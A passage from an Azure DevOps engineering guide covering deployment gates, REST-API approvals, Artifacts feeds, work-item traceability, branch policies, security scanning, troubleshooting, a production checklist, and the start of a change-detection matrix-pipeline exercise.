        echo "  ⛔ no SBOM attached"; fail=1
      fi

      # 3. ⭐ is the artifact built from an allowed branch?
      BRANCH=$(jq -r '.branch' $(Pipeline.Workspace)/image-info-shop-api/build-info.json)
      [[ "$BRANCH" =~ ^(main|release/.*)$ ]] || { echo "  ⛔ built from $BRANCH"; fail=1; }

      # 4. ⭐ is there a linked work item?
      WI=$(curl -s -u ":$SYSTEM_ACCESSTOKEN" \
        "$SYSTEM_TEAMFOUNDATIONCOLLECTIONURI$SYSTEM_TEAMPROJECT/_apis/build/builds/$BUILD_BUILDID/workitems?api-version=7.1" \
        | jq '.value | length')
      if [[ "${{ parameters.requireChangeTicket }}" == "True" ]] && (( WI == 0 )); then
        echo "  ⛔ no linked work item — every production deploy needs a change ticket"; fail=1
      else
        echo "  ✅ $WI linked work item(s)"
      fi

      # 5. ⭐ has staging had a successful smoke test in the last 2 hours?
      ok=$(curl -sG "$PROMETHEUS/api/v1/query" --data-urlencode \
        'query=max_over_time(probe_success{job="blackbox",instance=~".*staging.*"}[2h])' \
        | jq -r '.data.result[0].value[1] // "0"')
      [[ "$ok" == "1" ]] || { echo "  ⛔ the staging synthetic probe failed in the last 2h"; fail=1; }

      (( fail == 0 )) && echo "✅ the gate passed" || { echo "⛔ the gate FAILED"; exit 1; }
    env:
      SYSTEM_ACCESSTOKEN: $(System.AccessToken)
    displayName: Run the pre-production gate
```

### 9.4 Approving from the CLI (for drills and automation)

```bash
# list the pending approvals
curl -s -u ":$PAT" \
  "$ORG/Shop/_apis/pipelines/checks/pendingapprovals?api-version=7.1-preview.1" | jq '.value[] | {id, run:.run.id, environment:.environment.name}'

# approve
RUN_ID=4417
curl -s -u ":$PAT" -XPOST \
  "$ORG/Shop/_apis/pipelines/checks/pendingapprovals?api-version=7.1-preview.1" \
  -H 'Content-Type: application/json' \
  -d '{"approvals":[{"run":{"id":'"$RUN_ID"'},"comment":"approved after reviewing the diff and the SBOM","status":"approved"}]}'

# reject
curl -s -u ":$PAT" -XPOST \
  "$ORG/Shop/_apis/pipelines/checks/pendingapprovals?api-version=7.1-preview.1" \
  -H 'Content-Type: application/json' \
  -d '{"approvals":[{"run":{"id":'"$RUN_ID"'},"comment":"the SBOM has 3 CRITICAL CVEs","status":"rejected"}]}'

# ⭐ and the deployment history — the audit trail
curl -s -u ":$PAT" \
  "$ORG/Shop/_apis/distributedtask/environmentdeploymentrecords?environmentId=<id>&api-version=7.1" \
  | jq '.value[] | {startedOn, finishedOn, requester:.requestOwner.displayName, result, environmentName}'
```

---

## 10 · Azure Artifacts — the package feed

### 10.1 Why it matters

```
YOUR BUILD ──► Azure Artifacts feed ──► your consumers
                      │
                      └── UPSTREAM SOURCE ──► npmjs.com / Maven Central /
                                              NuGet.org / PyPI
   ⭐ the feed CACHES what it pulled from upstream. Two benefits:
      1. SPEED: the second build gets the package from your feed, not npmjs.
      2. ⭐⭐ RESILIENCE: if npmjs has an outage (it happens), your builds
         still work — everything is already cached.
      3. SECURITY: you control which upstream packages enter your environment,
         and you can run a vulnerability scan on the cached copies.
```

### 10.2 Set it up

```bash
# Artifacts → Feeds → + New feed
#   Name: shop
#   Visibility: People in this project
#   ⭐ "Include packages from upstream sources": ON
#     npm:    https://registry.npmjs.org/
#     NuGet:  https://api.nuget.org/v3/index.json
#     Maven:  https://repo.maven.apache.org/maven2/
#     Python: https://pypi.org/
#     ⭐ Universal Packages: no upstream (they're your own)

az artifacts feed list -o table
az artifacts universal publish --feed shop --name shop-api --version 1.4.2 --path dist/ --description "…"
az artifacts universal list --feed shop --package shop-api
az artifacts universal download --feed shop --name shop-api --version 1.4.2 --path ./downloaded
```

### 10.3 Wire your builds to it

```xml
<!-- ⭐ Maven: apps/shop-api/pom.xml -->
<repositories>
  <repository><id>shop-azure</id>
    <url>https://pkgs.dev.azure.com/shop-devops/Shop/_packaging/shop/maven/v1</url>
    <releases><enabled>true</enabled></releases><snapshots><enabled>true</enabled></snapshots>
  </repository>
</repositories>
<distributionManagement>
  <repository><id>shop-azure</id>
    <url>https://pkgs.dev.azure.com/shop-devops/Shop/_packaging/shop/maven/v1</url>
  </repository>
</distributionManagement>
```

```xml
<!-- ⭐ and ~/.m2/settings.xml — generated by the Maven task, or committed: -->
<settings>
  <servers>
    <server><id>shop-azure</id>
      <username>VssToken</username>
      <password>${env.AZURE_ARTIFACTS_TOKEN}</password>   <!-- ⭐ from `az artifacts universal`
                                                                or NuGetAuthenticate@1 -->
    </server>
  </servers>
</settings>
```

```json
// ⭐ npm: apps/shop-ui/.npmrc
registry=https://pkgs.dev.azure.com/shop-devops/Shop/_packaging/shop/npm/registry/
always-auth=true
// ⭐ in CI, `npm ci` after the NodeTool + NuGetAuthenticate tasks, or:
//    - task: npmAuthenticate@0
//      inputs: {workingFile: apps/shop-ui/.npmrc}
```

```yaml
# ⭐ the pipeline steps
- task: NuGetAuthenticate@1                       # ⭐ authenticates ALL feed types
  displayName: Authenticate to Azure Artifacts

- task: Maven@4
  inputs:
    mavenPomFile: apps/shop-api/pom.xml
    goals: 'clean deploy'
    publishJUnitResults: true
    testResultsFiles: '**/surefire-reports/TEST-*.xml'
    codeCoverageToolOption: JaCoCo
    javaHomeOption: JDKVersion
    jdkVersionOption: '1.21'
    mavenAuthenticateFeed: true                  # ⭐ uses the NuGetAuthenticate creds
    effectivePomSkip: true
    sonarQubeRunAnalysis: false

- task: Npm@1
  inputs:
    command: custom
    workingDir: apps/shop-ui
    customCommand: 'ci --registry=$(FEED_NPM_URL)'
    customRegistry: useFeed
    customFeed: shop

- task: UniversalPackages@0
  inputs:
    command: publish
    publishDirectory: '$(Build.ArtifactStagingDirectory)/dist'
    vstsFeed: shop
    vstsFeedPackage: shop-config
    versionOption: custom
    packageVersion: '$(Build.BuildNumber)'
    publishedPackageVar: packageRef

# ⭐ retention: Artifacts → Feed settings → Policies
#   "Retain packages for N days after deletion" — recover a mistake
#   Views: @local, @prerelease, @release  ⭐ promote through views, not versions
az artifacts universal promote --feed shop --name shop-api --version 1.4.2 --view release
```

---

## 11 · Boards, Tests and traceability

### 11.1 Linking work items to commits and builds ⭐

```
The traceability chain, which is Azure DevOps' best feature:

  Work Item #42 "Checkout fails for platinum customers"
    ← linked from commit a1b2c3d  ("fix(checkout): handle platinum tier #42")
      ← built by run #4417
        ← deployed to staging by run #4418
          ← tested by Test Run #88 (12 passed, 1 failed)
            ← released to production by run #4419, approved by @sre-lead

  Work Item #42 → Development tab shows ALL of that. ⭐
```

```bash
# ⭐ the commit-message convention that makes it automatic
git commit -m "fix(checkout): handle platinum-tier provider timeout

Resolves #42"
# ⭐ AB#42 or #42 or "Fixes #42" all create the link automatically

# from the CLI
az repos pr create --repository shop --source-branch fix/platinum --target-branch main \
  --title "fix(checkout): platinum provider timeout" \
  --work-items 42 \
  --reviewers sre-lead@shop.example.com \
  --squash true --delete-source-branch true --draft false

az boards work-item show 42
az boards work-item update 42 --state Resolved --fields "Microsoft.VSTS.Common.ResolvedReason=Fixed"
az boards work-item relation add --id 42 --relation-type "Tests" --target-id <test-run-id>

# ⭐ query the links
curl -s -u ":$PAT" \
  "$ORG/Shop/_apis/build/builds/4417/workitems?api-version=7.1" | jq .
curl -s -u ":$PAT" \
  "$ORG/Shop/_apis/test/runs/88/points?api-version=7.1" | jq .
```

### 11.2 Test Plans — manual and automated

```
Test Plans → New test plan → "Checkout regression"
  → New suite (static, requirement-based, or query-based)
    → New test case
        Title: "Platinum customer checkout succeeds"
        Steps:
          1. Log in as a platinum customer
          2. Add 3 items to the cart
          3. Proceed to checkout
          4. Enter a valid card
          5. Submit
        Expected result: The order is confirmed; the cart is empty; the
                         receipt email is sent within 60s.
        ⭐ Parameters: {tier: [standard, gold, platinum]}  → data-driven
        ⭐ Attachments: a HAR file, a screenshot
  → Run → a test RUN with points per parameter combination
  → each point is Passed/Failed with a comment and an attachment
  → ⭐ a Failed point can create a Bug work item with one click,
     and it carries the steps, the environment and the attachments
```

```yaml
# ⭐ and automated test runs from a pipeline, reported into Test Plans
- task: VSTest@2                              # for .NET
  inputs:
    testSelector: testAssemblies
    testAssemblyVer2: '**/*Tests.dll'
    runSettingsFile: 'tests.runsettings'
    codeCoverageEnabled: true
    publishRunAttachments: true
    testRunTitle: 'Integration — $(Build.SourceBranchName)'
    pathtoCustomTestAdapters: ''
    runTestsInIsolation: false
    rerunFailedTests: true                    # ⭐ built-in flake retry
    rerunMaxAttempts: 2
    rerunFailedTestCasesMaxLimit: 10

- task: PublishTestResults@2
  inputs:
    testResultsFormat: JUnit
    testResultsFiles: '**/junit-*.xml'
    mergeTestResults: true
    failTaskOnFailedTests: true
    testRunTitle: '$(Agent.JobName)'
    buildPlatform: '$(Build.SourceBranchName)'
    buildConfiguration: '$(BUILD_CONFIGURATION)'
    publishRunAttachments: true

# ⭐ the flaky-test detection Azure DevOps gives you for free:
# Tests → Analysis → "Flaky tests"
#   it identifies tests that failed then passed on the SAME commit,
#   shows the flake rate over time, and lets you DISABLE a test so it
#   stops blocking builds while staying visible.
```

### 11.3 Branch policies tied to Boards

```
Repos → Branches → ⋯ on main → Branch policies
  ☑ Require a minimum number of reviewers:        1
  ☑ Check for linked work items:                  ⭐ Required
       (a PR with no linked Board item cannot merge)
  ☑ Check for comment resolution:                 All
  ☑ Limit merge types:                            Squash only
  ☑ Require work item linking                     ⭐ traceability enforced
  ☑ Build validation:  ⭐⭐ THE MOST IMPORTANT ONE
       Build pipeline:  shop-ci
       Trigger:         Automatic
       Policy requirement: ⭐ Required
       ⭐ "Queue while the source branch is updated" (re-run on new commits)
       Path filter:     (blank = all paths)
  ☑ Status checks:                                ⭐ external CI can post a status
       Status name: github-actions/ci
       Policy requirement: Required
  ☑ Require a specific merge type
  ⭐ Automatic reviewers:
       Required: platform-team (for .pipelines/** and helm/**)
       Path filter: .pipelines/*;helm/*;azure-pipelines.yml
       ⭐ THIS IS THE CODEOWNERS EQUIVALENT. Set it.
  ⭐ "Reset code reviewer votes when there are new changes" → ON
```

```bash
# branch policies are scriptable — put them in Git
cat > .pipelines/branch-policy.json <<'EOF'
[
  {"type":{"id":"fa4e907d-c16b-4a4c-9dfa-4916e5d171ab"},"settings":{
      "minimumApproverCount":1,"creatorVoteCounts":false,
      "allowDownvotes":false,"resetOnSourcePush":true,
      "blockLastPusherVote":true}},
  {"type":{"id":"c6a1889d-b943-4856-b76f-9e46bb6b0df2"},"settings":{
      "enforceConsistentRefType":true,"requireWorkItemLinks":true}},
  {"type":{"id":"0609b952-1397-4640-95ec-e00a01b2c241"},"settings":{
      "buildDefinitionId":12,"queueOnSourceUpdateOnly":true,
      "manualQueueOnly":false,"displayName":"shop-ci","validDuration":720}},
  {"type":{"id":"2b2b8b6a-6d6b-4b3f-9b6a-1c3d0e5f8a9b"},"settings":{
      "automaticReviewers":[{"required":true,"reviewerId":"<platform-team-id>",
        "pathFilters":["/.pipelines/*","/helm/*","/azure-pipelines.yml"]}]}}
]
EOF
curl -s -u ":$PAT" -XPOST \
  "$ORG/Shop/_apis/git/repositories/shop/policy/configurations?api-version=7.1" \
  -H 'Content-Type: application/json' -d @<(jq '.[0]' .pipelines/branch-policy.json) | jq .
```

---

## 12 · Microsoft Defender for DevOps — the security scanning

```
Project Settings → Overview → ⭐ "Enable Microsoft Defender for DevOps"
  → it scans automatically on:
      · every push (Advanced Security: code scanning + secret scanning)
      · dependency scanning via Component Governance
      · IaC scanning (Bicep, ARM, Terraform, Kubernetes manifests)
```

```yaml
# the pipeline integration
steps:
  # ⭐ 1. Component Governance — dependency scanning, free and always available
  - task: ComponentGovernanceComponentDetection@0
    inputs:
      scanType: Register
      verbosity: Detailed
      alertWarningLevel: High
      failOnAlert: true                 # ⭐⭐ make it a gate
      failOnAlertSeverity: Critical
      ignoreDirectories: 'node_modules,vendor,.git,test'
      governanceProduct: cd0e9c7a-0000-0000-0000-000000000000
    continueOnError: false

  # ⭐ 2. CredScan — Microsoft's credential scanner
  - task: CredScan@3
    inputs: {toolMajorVersion: 'V2', scanFolder: '$(Build.SourcesDirectory)'}

  # 3. the post-analysis step that fails the build on findings
  - task: PostAnalysis@2
    inputs:
      GdnExportAllTools: false
      GdnExportGdnFolder: '$(Build.SourcesDirectory)/.gdn'
      ToolLogsNotFoundAction: Standard
      AllTools: false
      CredScan: true
      Semmle: true
      FortifySCA: false

  # 4. publish the security reports to the build summary
  - task: PublishSecurityAnalysisLogs@3
    inputs: {ArtifactName: 'CodeAnalysisLogs', ArtifactType: Container,
             AllTools: false, ToolLogsNotFoundAction: Standard}
  - task: SdtReport@2
    inputs: {AllTools: false, CredScan: true, Semmle: true, GdnExportSarifFile: true}

  # 5. push SARIF to GitHub code scanning (if the code is on GitHub)
  - bash: |
      for f in $(Build.SourcesDirectory)/.gdn/*.sarif; do
        gh api -X POST "repos/3558Bhk/shop/code-scanning/sarifs" \
          -F sarif=@$f -F category=azure-defender -F checkout_uri="$BUILD_REPOSITORY_URI" \
          -F commit_sha="$BUILD_SOURCEVERSION" -F ref="$BUILD_SOURCEBRANCH"
      done
    env: {GH_TOKEN: $(GH_TOKEN)}
```

```
Where the results land:
  Azure DevOps → Repos → ⭐ Advanced Security → Alert lists
    · Code scanning alerts      (Semmle/CodeQL, if enabled)
    · Secret scanning alerts    (credentials in the repo history)
    · Dependency alerts         (from Component Governance)
    · IaC scanning alerts
  Azure Portal → Microsoft Defender for Cloud → ⭐ Defender for DevOps
    a single pane across all your Azure DevOps orgs and GitHub orgs
```

---

## 13 · Troubleshooting — the failures that actually happen

### 13.1 The pipeline won't run

| Symptom | Cause | Fix |
|---|---|---|
| "The pipeline is not triggered by a push" | The `trigger:` paths filter excluded your file | `az pipelines show --id X` → check `configuration.trigger` |
| The PR build doesn't run | `pr:` is missing, or the draft setting excludes it | Add `pr: branches: include: [main]`; `drafts: true` if you want draft PRs |
| "Queued" forever: *Waiting for an agent* | ⭐ No parallel jobs, or no agent matches the demands | Project Settings → Parallel jobs → buy one, or install a self-hosted agent |
| "Queued" forever: *The pipeline must be authorized* | ⭐ **Job authorization scope** — the pipeline isn't allowed to use that pool/queue/connection | Project Settings → Pipelines → Pipeline permissions → authorize the pipeline on the queue/connection/variable group |
| The pipeline runs but a stage is skipped | The `condition:` evaluated false | Add `- script: echo "$AGENT_JOBSTATUS / $(Build.Reason) / $(Build.SourceBranchName)"` and re-read the condition |
| ⛔ "Job canceled due to pipeline failure" | A dependency failed | Look UP the DAG, not at this job |
| The scheduled run never happens | The schedule only runs on the **default branch's** YAML | Merge the `schedules:` block to `main` |

### 13.2 Variables are empty

```bash
# ⭐ the #1 cause: you used the wrong expression syntax for the timing
#    template-time ${{ }} cannot see a runtime value
#    macro $( ) cannot be used in a `condition:`
#    runtime $[ ] is required for cross-job outputs

# dump everything to find out what IS available
- bash: |
    echo "===== predefined ====="
    env | grep -E '^(BUILD_|SYSTEM_|AGENT_|TF_|VSTS_)' | sort
    echo "===== my variables ====="
    env | grep -E '^(MY_|SERVICE|REGISTRY)' | sort
    echo "===== template-expanded ====="
    echo 'service=${{ variables.service }}  branch=${{ variables["Build.SourceBranchName"] }}'
    echo "===== macro ====="
    echo 'service=$(service) branch=$(Build.SourceBranchName)'
    echo "===== runtime ====="
    echo 'digest=$(DIGEST)'
  displayName: Dump the context
  env:
    MY_SECRET: $(DB-PASSWORD)        # ⭐ masked as *** but present

# a variable group's secrets are INVISIBLE unless the group is authorized
# Project Settings → Pipelines → Library → the group → Pipeline permissions → +
```

### 13.3 The deployment job fails in ways the build job wouldn't

```
⛔ "Artifact manifests was not found"
   → deployment jobs do NOT auto-download. Add `- download: current` + `artifact:`.
⛔ "The environment 'production' does not exist"
   → create it under Pipelines → Environments, matching the name EXACTLY.
⛔ the job hangs at "Waiting for approval"
   → that's correct. Check who the required reviewers are; you may not be one.
⛔ "Deployment job cannot have dependencies on other deployment jobs in the same stage"
   → true. Put them in different stages.
⛔ "The `strategy` property is required for a deployment job"
   → add `strategy: runOnce: deploy: steps: …`
⛔ steps inside `strategy.runOnce.deploy` can't use `condition: always()` the way you expect
   → the deployment lifecycle hooks (preDeploy/deploy/postRouteTraffic/on:success/on:failure)
     have their own ordering rules.
```

### 13.4 Docker-in-Docker on a hosted agent

```bash
# ⭐ the hosted ubuntu-latest agent HAS Docker and BuildKit. Verify:
- bash: |
    docker version
    docker buildx version
    docker info | grep -iE 'storage driver|cgroup|runtime'
    docker run --rm hello-world

# ⛔ "permission denied while trying to connect to the Docker daemon socket"
#    → you're on a SELF-HOSTED agent whose service user isn't in the docker group
sudo usermod -aG docker vsts
sudo ./svc.sh stop && sudo ./svc.sh start

# ⛔ BuildKit cache-to type=registry fails with "denied"
#    → you logged in AFTER creating the builder. Log in first.
- bash: |
    echo "$TOKEN" | docker login ghcr.io -u "$USER" --password-stdin
    docker buildx create --use --name b
    docker buildx build … --cache-to type=registry,… --push

# ⛔ "no space left on device" on a hosted agent
#    → the agent has ~14 GB of disk. A big monorepo + a layer cache exhausts it.
#    → `workspace: clean: all`, prune between steps, or use a self-hosted agent.
- bash: docker system df && docker builder prune -af --keep-storage 5GB

# ⭐ the ACR Tasks alternative — no Docker on the agent at all
- task: AzureCLI@2
  inputs:
    azureSubscription: shop-wif
    scriptType: bash
    inlineScript: az acr build -r $ACR -i shop-api:$(Build.SourceVersion) apps/shop-api
```

### 13.5 The Helm/Kubernetes step fails

```bash
# ⭐ diagnose in this order
- bash: |
    set -x
    kubectl version --client
    kubectl cluster-info                          # can it reach the cluster at all?
    kubectl auth can-i --list                     # ⭐ what may this identity do?
    kubectl -n shop get deploy,pods,svc
    helm version
    helm list -n shop -a
    helm get values shop -n shop
    helm history shop -n shop | tail -5
    helm template shop ./helm/shop --values helm/values/dev.yaml | head -50   # ⭐ render locally
    helm upgrade --install shop ./helm/shop -n shop --dry-run --debug 2>&1 | tail -40
    kubeconform -strict -summary <(helm template shop ./helm/shop --values helm/values/dev.yaml)

# ⛔ "Error: INSTALLATION FAILED: cannot re-use a name that is still in use"
#    → you used `helm install` not `helm upgrade --install`
# ⛔ "context deadline exceeded"
#    → the pods never became Ready. `kubectl describe pod` for the reason:
#      ImagePullBackOff (the digest is wrong / the pull secret is missing),
#      CrashLoopBackOff (the app is broken), a failing readiness probe.
# ⛔ "annotation validation error: metadata.annotations: Too long"
#    → the last-applied-configuration annotation. Use Server-Side Apply:
#      kubectl apply --server-side --force-conflicts -f x.yaml
# ⛔ the AKS connection works in the UI but not in the pipeline
#    → the service connection's resource-group scope doesn't include the cluster.
#      Re-authorize it, or grant the SP the "Azure Kubernetes Service Cluster User Role".
```

### 13.6 The agent is the problem

```bash
# on a self-hosted agent
cd ~/agent/_diag && ls -lt | head
tail -200 $(ls -t Agent_*.log | head -1)
tail -200 $(ls -t Worker_*.log | head -1) | grep -iE 'error|fail|exception'
./config.sh --diagnostics                    # ⭐ produces a zip you can inspect
systemctl status vsts.agent.*
df -h _work                                  # ⭐ disk full is very common
du -sh _work/*                               # which workspace is huge?

# reset a poisoned workspace
rm -rf ~/agent/_work/*
# and make it automatic:
# jobs: - job: X
#   workspace: {clean: all}                  # ⭐ cleans outputs, resources AND the repo

# the agent is offline in the UI but the process is running
curl -s -u ":$PAT" "$ORG/_apis/distributedtask/pools/$POOL_ID/agents?api-version=7.1" \
  | jq '.value[] | {name, status, maxParallelism, version}'
# status "offline" with the process alive = a network/proxy issue or a clock skew
timedatectl                                   # ⭐ NTP skew > 5 min breaks auth
```

### 13.7 The build is too slow

```bash
# ⭐ measure before you optimise
- bash: |
    echo "==> per-step durations"
    # the run summary page shows them; or:
    curl -s -u ":$PAT" \
      "$ORG/Shop/_apis/build/builds/$BUILD_BUILDID/timeline?api-version=7.1" \
      | jq -r '.records[] | select(.type=="Task") |
               "\(((.finishTime|fromdate) - (.startTime|fromdate)) | tostring)s\t\(.name)"' \
      | sort -rn | head -20

# the usual answers:
#  1. no dependency cache            → Cache@2 (see §2.4)
#  2. no Docker layer cache          → cache-from/cache-to registry
#  3. sequential jobs that could be parallel → dependsOn: [] and a matrix
#  4. fetchDepth: 0 on a huge repo   → fetchDepth: 1
#  5. `clean: true` re-cloning every time → a self-hosted agent with a warm workspace
#  6. npm install instead of npm ci  → npm ci respects the lockfile and is faster
#  7. a 10-minute E2E suite on every PR → move it to main-only or a nightly run
#  8. building a service that didn't change → path filters + a change-detection step
```

```yaml
# ⭐ change detection: only build the services whose paths changed
- bash: |
    set -euo pipefail
    if [[ "$(Build.Reason)" == "PullRequest" ]]; then
      BASE=$(git merge-base origin/$(System.PullRequest.TargetBranchName) HEAD)
    else
      BASE=$(git rev-parse HEAD~1 2>/dev/null || git rev-parse HEAD)
    fi
    CHANGED=$(git diff --name-only "$BASE" HEAD)
    echo "$CHANGED"
    for svc in shop-api checkout order-worker shop-ui payment-mock; do
      if echo "$CHANGED" | grep -qE "^apps/$svc/|^helm/|^\.pipelines/"; then
        echo "##vso[task.setvariable variable=build_$svc;isOutput=true]true"
      else
        echo "##vso[task.setvariable variable=build_$svc;isOutput=true]false"
      fi
    done
  name: changes
- job: BuildShopApi
  dependsOn: Detect
  condition: eq(dependencies.Detect.outputs['changes.build_shop_api'], 'true')
```

---

## 14 · The production checklist

```
ORGANISATION AND PROJECT
  □ the project is PRIVATE
  □ Pipeline security: "Make secrets available to builds of forks" is OFF
  □ "Enforce job authorization scope" is ON
  □ "Prevent unintended pipeline runs" is ON
  □ the build service's Contribute permission is DENIED on the repo
    (so a pipeline can't push code back to main)
  □ an audit log retention policy exists (Organization Settings → Policies)

REPOSITORY AND BRANCHES
  □ branch protection on main: reviewers, build validation, work-item linking
  □ ⭐ automatic reviewers on .pipelines/**, helm/**, k8s/** → the platform team
  □ squash-only merges; force pushes blocked
  □ secret scanning + push protection enabled
  □ the lockfiles are committed

PIPELINES
  □ the pipeline YAML lives in the repo, not in the UI (no classic build definitions)
  □ ⭐ `extends` templates for anything more than one team uses
  □ template repositories pinned to a TAG, never a branch
  □ `name:` set, so runs are human-identifiable
  □ `trigger:` and `pr:` have path filters; docs changes cost zero
  □ `autoCancel: true` on PR builds; `batch: true` on main
  □ `timeoutInMinutes` on every job (the default is 60 — too long)
  □ `cancelTimeoutInMinutes` set, so a stuck job can be killed
  □ `workspace: clean: all` on self-hosted agents
  □ the logic is in `scripts/*.sh`, not in inline YAML  ⭐ portability + testability
  □ `set -euo pipefail` at the top of every bash step
  □ every step has a `displayName`
  □ ⛔ no `${{ github.event.* }}`-style untrusted interpolation into a script

SECRETS
  □ ⭐ a Workload Identity Federation service connection for Azure — no client secret
  □ a variable group LINKED TO KEY VAULT — no secret stored in Azure DevOps
  □ Key Vault secrets scoped to the specific vault, not the subscription
  □ the WIF subject identifier is as narrow as possible (per environment)
  □ `System.AccessToken` is mapped via `env:` and never echoed
  □ secrets are rotated on a schedule; rotation is rehearsed
  □ a secret scan (CredScan or gitleaks) is a blocking gate
  □ no `echo $(MY_SECRET)` anywhere, ever

ARTIFACTS
  □ build once; promote the SAME digest through dev → staging → production
  □ deploy by digest, never by a mutable tag
  □ immutable tags enabled on ACR
  □ SBOM + provenance attached to every release image
  □ images signed and the signature verified at the gate
  □ retention policies set on Artifacts feeds and on pipeline artifacts

ENVIRONMENTS AND GATES
  □ dev / staging / production environments exist
  □ ⭐ production: approvals, branch control, business hours, a required template,
       parallel deployments = one at a time
  □ the approver instructions contain a real checklist
  □ "Allow requestors to approve their own runs" is OFF
  □ the pre-production gate checks: signature, SBOM CVEs, source branch,
    a linked work item, and a recent successful staging smoke test

DEPLOYMENT
  □ `helm upgrade --install --atomic --timeout 10m`
  □ `maxUnavailable: 0`, `maxSurge: 1`, a `preStop` sleep, three probes
  □ a smoke test after every deploy, with automatic rollback on failure
  □ `revisionHistoryLimit` ≥ 5 so `helm rollback` / `kubectl rollout undo` works
  □ the deploy script captures evidence (pods, events, logs) BEFORE rolling back
  □ the canary analysis compares the canary against stable, with real thresholds
  □ a rollback has been rehearsed and takes under 60 seconds

AGENTS
  □ the pool the pipeline uses is authorized for it (Job authorization scope)
  □ self-hosted agents run as a non-root user with a bounded _work directory
  □ a scheduled cleanup of _work, or `workspace: clean: all`
  □ agent VMs are patched (or reimaged after every use — VMSS pools)
  □ `--diagnostics` is something you know how to run

OBSERVABILITY OF THE PIPELINE ITSELF
  □ per-step durations are visible and reviewed monthly
  □ the failure rate by stage is measured
  □ flaky tests are identified (Tests → Analysis → Flaky tests) and quarantined
  □ the DORA metrics are recorded (deploy frequency, lead time, failure rate, MTTR)
  □ a notification goes to Slack on every production deploy AND every failure
  □ the build URL is in every notification, so anyone can click through

TRACEABILITY
  □ every commit links a work item (#42 in the message)
  □ every production deploy links a change ticket
  □ the Deployment history on the production environment answers
    "what is running, since when, who approved it, from which commit"
  □ `git tag prod-YYYY-MM-DD` is moved on every production deploy
```

---

<a name="tasks--answers"></a>
## 🎯 Tasks & Answers

Five tasks. Each is a real piece of work an Azure DevOps engineer does. **Attempt them before opening the answer.**

| # | Task |
|---|---|
| 1.1 | Build a **matrix pipeline** for a polyglot monorepo that only builds what changed, and aggregate the results |
| 1.2 | Implement a **secure `extends` template** that no team can bypass, and prove they can't |
| 1.3 | Wire up **Key Vault + WIF + a per-environment variable group**, with zero secrets in Azure DevOps |
| 1.4 | Build a **production gate** that refuses to deploy when an SLO is burning, and rehearse the rollback |
| 1.5 | Migrate a **classic (UI-built) release pipeline** to YAML without losing the audit trail |

---

### Task 1.1 — The change-aware polyglot matrix pipeline

**The repo** is a monorepo with five services in four languages. A PR that changes only `apps/shop-ui/README.md` currently runs all five builds and takes 22 minutes. **Make it take under 3 minutes without losing coverage**, and make the aggregate test report show all five services in one place.

<details>
<summary><b>💡 Hints</b></summary>

1. Two independent levers: **don't run what didn't change**, and **run what must run in parallel**.
2. Change detection needs `git diff` against the merge base — which needs `fetchDepth: 0` (or at least enough depth).
3. Azure DevOps matrices are declared statically. For a *dynamic* set of services you need `${{ each }}` over a compile-time list plus a **runtime condition** per job.
4. The aggregate report needs `mergeTestResults: true` and a single `testRunTitle`.
</details>

**✅ Answer**

**Step 1 — the service catalogue, declared once (compile time)**

```yaml
# .pipelines/variables/services.yml
variables:
  services:
    - {name: shop-api,      lang: java,   path: apps/shop-api,      timeout: 25}
    - {name: checkout,      lang: go,     path: apps/checkout,      timeout: 15}
    - {name: order-worker,  lang: python, path: apps/order-worker,  timeout: 15}
    - {name: shop-ui,       lang: node,   path: apps/shop-ui,       timeout: 20}
    - {name: payment-mock,  lang: go,     path: apps/payment-mock,  timeout: 15}
```

**Step 2 — change detection as its own job, with outputs**

```yaml
# .pipelines/templates/detect-changes.yml
parameters:
  - name: services
    type: object

jobs:
  - job: Detect
    displayName: 🔍 What changed?
    timeoutInMinutes: 5
    steps:
      - checkout: self
        fetchDepth: 0                    # ⭐⭐ required for the merge-base diff

      - bash: |
          set -euo pipefail
          REASON="$(Build.Reason)"
          if [[ "$REASON" == "PullRequest" ]]; then
            TARGET="$(System.PullRequest.TargetBranchName)"
            git fetch --no-tags --depth=200 origin "$TARGET"
            BASE=$(git merge-base "origin/$TARGET" HEAD)
            echo "  PR build: diffing against merge-base ${BASE:0:7} of $TARGET"
          else
            # ⭐ for a push, diff against the previous successful build's commit
            PREV=$(curl -s -u ":$SYSTEM_ACCESSTOKEN" \
              "$SYSTEM_TEAMFOUNDATIONCOLLECTIONURI$SYSTEM_TEAMPROJECT/_apis/build/builds?definitions=$BUILD_DEFINITIONID&resultFilter=succeeded&statusFilter=completed&\$top=2&api-version=7.1" \
              | jq -r '.value[1].sourceVersion // empty')
            if [[ -n "$PREV" && "$PREV" != "null" ]]; then BASE="$PREV"; else BASE="HEAD~1"; fi
            echo "  push build: diffing against ${BASE:0:7}"
          fi

          CHANGED=$(git diff --name-only "$BASE" HEAD || git diff --name-only HEAD~1 HEAD || echo "")
          echo "  changed files:"; echo "$CHANGED" | sed 's/^/    /'

          # ⭐⭐ PLATFORM-WIDE CHANGES force a full rebuild
          GLOBAL=false
          if echo "$CHANGED" | grep -qE '^(\.pipelines/|helm/|k8s/|scripts/|ci/|azure-pipelines\.yml)'; then
            GLOBAL=true
            echo "  ⭐ a platform-wide path changed — building EVERYTHING"
          fi
          echo "##vso[task.setvariable variable=globalChange;isOutput=true]$GLOBAL"

          for svc_path in ${{ each s in parameters.services }}${{ s.path }}:${{ s.name }} ${{ end }}; do
            path="${svc_path%%:*}"; name="${svc_path##*:}"
            if [[ "$GLOBAL" == "true" ]] || echo "$CHANGED" | grep -q "^$path/"; then
              echo "  ✅ BUILD   $name"
              echo "##vso[task.setvariable variable=build_${name//-/_};isOutput=true]true"
            else
              echo "  ⏭  SKIP    $name"
              echo "##vso[task.setvariable variable=build_${name//-/_};isOutput=true]false"
            fi
          done
        name: detect
        displayName: Detect changed services
        env:
          SYSTEM_ACCESSTOKEN: $(System.AccessToken)

      # ⭐ make the result visible on the run summary
      - bash: |
          {
            echo "## Changed services"
            echo
            echo "| Service | Build? |"
            echo "|---|---|"
          } > summary.md
          for n in ${{ each s in parameters.services }}${{ s.name }} ${{ end }}; do
            echo "| $n | $([[ "$(detect.build_${n//-/_})" == "true" ]] && echo '✅ yes' || echo '⏭ skipped') |" >> summary.md
          done
          echo "##vso[task.uploadsummary]summary.md"
        displayName: Write the run summary
```

**Step 3 — the per-service jobs, conditioned on the outputs**

```yaml
# .pipelines/ci-fast.yml
name: $(Date:yyyyMMdd).$(Rev:.r)

trigger:
  branches: {include: [main]}
  batch: true                              # ⭐ one run for a burst of commits
pr:
  branches: {include: [main]}
  autoCancel: true                         # ⭐⭐ the other big minute-saver
  drafts: false

pool: {vmImage: ubuntu-latest}
variables:
  - template: .pipelines/variables/services.yml

stages:
  - stage: Analyze
    jobs:
